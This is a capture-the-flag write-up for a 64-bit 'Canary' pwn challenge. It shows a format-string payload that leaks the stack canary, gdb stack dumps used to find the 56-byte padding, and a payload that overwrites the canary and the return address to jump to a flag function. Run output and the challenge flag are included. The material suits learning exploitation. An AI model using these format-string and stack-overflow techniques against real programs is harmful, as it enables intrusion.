Stack canary.
64bits = no way to bruteforce it, since their is no fork() or equivalent in the code.

format strings leak:

Hi! What's your name? %lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx
Nice to meet you, 7fffffffbae0-57-ffffffffffffffa7-7fffffffe170-12-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-2d786c252d786c25-21786c252d786c25-220567e68661000a-7fffffffe1f0-4009c9-7fffffffe2e0-0-0!

RAX: 0x220567e68661000a 
[...]
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40093b <greet+170>:	call   0x400670 <gets@plt>
   0x400940 <greet+175>:	nop
   0x400941 <greet+176>:	mov    rax,QWORD PTR [rbp-0x8]
=> 0x400945 <greet+180>:	xor    rax,QWORD PTR fs:0x28
   0x40094e <greet+189>:	je     0x400955 <greet+196>
   0x400950 <greet+191>:	call   0x400630 <__stack_chk_fail@plt>

Got it!
In this exemple, the canary is store in RAX, but we leaked it from the format string before.
Nice to meet you, [...]-220567e68661000a-[...] (right here).

The idea is to leak the canary with the format string, overwrite it AND the next return value from the second '_gets' call.

Finding the canary offset:

Here is the stack after a leak followed by a valid input:
gdb-peda$ x/100x $sp
0x7fffffffe180:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d <- junk
0x7fffffffe188:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d 
0x7fffffffe190:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d 
0x7fffffffe198:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d <- junk
0x7fffffffe1a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 <- input
0x7fffffffe1a8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 
0x7fffffffe1b0:	0x00	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d
0x7fffffffe1b8:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d
0x7fffffffe1c0:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d <- [...]
0x7fffffffe1c8:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x2d
0x7fffffffe1d0:	0x25	0x6c	0x78	0x2d	0x25	0x6c	0x78	0x21 <- input
0x7fffffffe1d8:	0x0a	0x00	0xcd	0x91	0xb5	0x3e	0xe4	0x3d <- canary

The padding will be  7*8 = 56 bytes long

payload = pad + canary

lets make a quick test only with a canary overwritting:

[root@Arch Canary]# python2.7 exploit.py 
[+] Opening connection to shell.actf.co on port 20701: Done
[+] Canary found: 51b2b481be15e300
[*] Switching to interactive mode
 else you want to tell me? Segmentation fault
 
Nice, the canary is overwrite, and we get ride of the stack smashing protection.

Let's see what we need to overwrite in order to controle the execution flow of the binary:
   0x400955 <greet+196>:	leave  
=> 0x400956 <greet+197>:	ret    
[...]
gdb-peda$ x/10x $sp
0x7fffffffe208:	0x00000000004009c9	0x00007fffffffe310
0x7fffffffe218:	0x0000000000000000	0x0000000000000000

In order to overwrite EIP, and jump somewhere at the execution of the 'ret' instruction, we need to provide 8 additional bytes (for the return address, but we can send a junk address, it's ok) and then the modified EIP value.

So our payload look's like: 56 bytes pad + canary + 8 bytes junk + EIP address

But where to jump now ?

'objdump -t canary':
0000000000400787 g     F .text	0000000000000013              flag

So our target is at 0x400787

A simple conversion in the little-indian format, and the exploit is ready to go.

See exploit.py for more details.

PWN! 
[root@Arch Canary]# python2.7 exploit.py 
[+] Opening connection to shell.actf.co on port 20701: Done
[+] Canary found: d4105abd32e53100
[*] Switching to interactive mode
 else you want to tell me? actf{youre_a_canary_killer_>:(}
Segmentation fault
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to shell.actf.co port 20701

We still get a Segfault since the return address was overwriten with 8 time '\x42'. 
For a clean exploit, you can make it point to the libc "exit()" function, for instance :)

I'm too lazy for that.
